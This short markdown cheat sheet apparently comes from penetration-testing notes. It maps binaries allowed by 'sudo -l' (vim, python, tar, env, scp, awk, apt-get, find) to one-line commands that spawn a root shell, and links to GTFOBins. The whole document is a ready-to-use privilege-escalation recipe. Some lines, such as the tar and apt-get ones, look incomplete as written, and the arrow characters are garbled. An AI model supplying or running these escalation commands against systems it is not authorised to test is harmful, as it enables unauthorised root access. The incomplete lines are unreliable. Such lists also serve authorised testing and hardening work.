### Sudo Binary âœ Exploit Flow

- `sudo -l` shows binary:
    - `vim` âœ `sudo vim -c '!sh'`
    - `python` âœ `sudo python3 -c 'import os; os.system("/bin/bash")'`
    - `tar` âœ `sudo tar --checkpoint-action=exec=/bin/bash`
    - `env` âœ `sudo env /bin/bash`
    - `scp` âœ `sudo scp -S /bin/bash x x`
    - `awk` âœ `sudo awk 'BEGIN {system("/bin/bash")}'`
    - `apt-get` âœ `sudo apt-get -o APT::Update::Pre-Invoke::=/bin/bash`
    - `find` âœ `sudo find . -exec /bin/bash \;`

- GTFOBin: https://gtfobins.github.io
